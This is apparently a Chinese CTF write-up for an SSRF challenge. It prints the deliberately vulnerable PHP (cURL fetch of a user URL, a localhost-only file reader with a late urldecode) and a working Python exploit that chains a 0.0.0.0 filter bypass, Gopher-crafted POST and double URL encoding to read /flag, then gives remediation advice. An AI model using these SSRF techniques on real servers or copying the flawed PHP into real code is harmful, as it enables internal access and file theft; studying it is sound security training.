# week3SSRF Me

## 题目简述

外层接口允许服务器使用 cURL 访问用户给出的 URL，只过滤 `127.0.0.1`、`dict`、`file` 和 `ftp`。内层 `read.php` 仅允许本机来源且要求 POST，请求体中的 `filename` 又会在过滤后额外执行一次 URL 解码。利用 `0.0.0.0` 绕过地址过滤、Gopher 构造原始 POST，再用双重 URL 编码即可读取 `/flag`。

## 解题过程

外层源码直接执行：

```php
$url = $_GET['url'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
echo curl_exec($ch);
```

请求 `?url=http://0.0.0.0/read.php` 时，cURL 会连接本机服务，而外层黑名单中没有 `0.0.0.0`。内层源码的关键点是：

```php
if ('127.0.0.1' != $_SERVER['REMOTE_ADDR']) {
    die('Allow local only');
}
if ('GET' === $_SERVER['REQUEST_METHOD']) {
    die('Invalid request mode');
}

$filename = $_POST['filename'];
if (preg_match('/..\//', $filename)) {
    die('nonono');
}
echo file_get_contents(urldecode($filename));
```

原 WP 把参数名写成了 `name`，但仓库源码实际读取的是 `filename`。令表单原始字节为 `filename=%252fflag`：PHP 解析表单后得到 `%2fflag`，过滤阶段看不到 `/`；随后 `urldecode()` 再解一层，最终变成 `/flag`。

下面的代码会自动计算 `Content-Length`、按 CRLF 组装 HTTP 请求并生成 Gopher URL，避免手工多编码一层或少编码一层：

```python
from urllib.parse import quote
import requests

target = "http://challenge/"
body = "filename=%252fflag"
raw_request = (
    "POST /read.php HTTP/1.1\r\n"
    "Host: 0.0.0.0\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body.encode())}\r\n"
    "Connection: close\r\n"
    "\r\n"
    f"{body}"
)

gopher_url = "gopher://0.0.0.0:80/_" + quote(raw_request, safe="")
response = requests.get(target, params={"url": gopher_url}, timeout=10)
print(response.text)
```

响应即为 `/flag` 的内容。

## 方法总结

完整链路是“cURL SSRF → `0.0.0.0` 访问本机 → Gopher 发送 POST → `filename` 双重解码绕过 → 任意文件读取”。此类问题不能靠少量协议和地址字符串黑名单修复；应只允许预先定义的目标，解析并校验最终 IP，禁用非 HTTP(S) 协议，并阻断服务端到回环、私网和元数据地址的连接。
